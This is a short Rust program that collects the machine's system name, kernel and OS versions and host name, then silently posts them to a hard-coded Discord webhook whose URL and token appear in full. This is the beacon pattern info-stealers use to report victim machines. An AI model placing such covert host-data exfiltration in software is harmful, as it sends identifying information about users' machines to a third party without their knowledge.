use anyhow::Result; 
use serenity::{http::Http, model::{channel::Embed,webhook::Webhook}};
use sysinfo::{System, SystemExt};

#[tokio::main]
async fn main(){
    let sys = System::new_all();
    let mut sysinfo = String::new();
    sysinfo.push_str(&format!("System name:             {}\n", unwrap_string(sys.name())));
    sysinfo.push_str(&format!("System kernel version:   {}\n", unwrap_string(sys.kernel_version())));
    sysinfo.push_str(&format!("System OS version:       {}\n", unwrap_string(sys.os_version())));
    sysinfo.push_str(&format!("System host name:        {}\n", unwrap_string(sys.host_name())));
    sysinfo.push_str(&format!("None:                    {}\n", unwrap_string(None)));

    send(sysinfo).await;
}

fn unwrap_string(info: Option<String>) -> String{
    match info {
        Some(s) => s,
        None => "?".to_string(),
    }
}

async fn send(data: String) -> Result<()>{
    let http = Http::new("token");

    let url = "https://discord.com/api/webhooks/1103235373561286687/HCqLWBG96VY1uJ9kdx5_Og8GeL8dGHx2Xhho88XH6fE8m4Tsw7cNXL1U-QRzP32Ajpor";
    let webhook = Webhook::from_url(&http, url).await?;

    let embed = Embed::fake(|e| {
    e.title("System info");
    e.description(
        data,
    );
    e
});

    webhook
        .execute(&http, true, |w| {
            w.content("content")
                .username("username")
                .embeds(vec![embed])
        })
        .await?;
    Ok(())
}
